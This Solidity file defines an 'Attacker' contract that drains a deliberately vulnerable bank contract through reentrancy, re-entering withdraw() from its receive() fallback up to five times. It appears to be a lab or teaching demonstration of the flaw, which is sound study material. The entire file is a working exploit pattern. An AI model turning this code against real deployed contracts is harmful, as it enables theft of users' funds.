// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

contract Attacker {
    VulnerableBank public vulnerableBank;
    uint256 public attackCount;
    uint256 public maxAttacks = 5;

    constructor(address _vulnerableBank) {
        vulnerableBank = VulnerableBank(_vulnerableBank);
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether");
        vulnerableBank.deposit{value: msg.value}();
        vulnerableBank.withdraw();
    }

    receive() external payable {
        if (attackCount < maxAttacks && address(vulnerableBank).balance >= 1 ether) {
            attackCount++;
            vulnerableBank.withdraw();
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
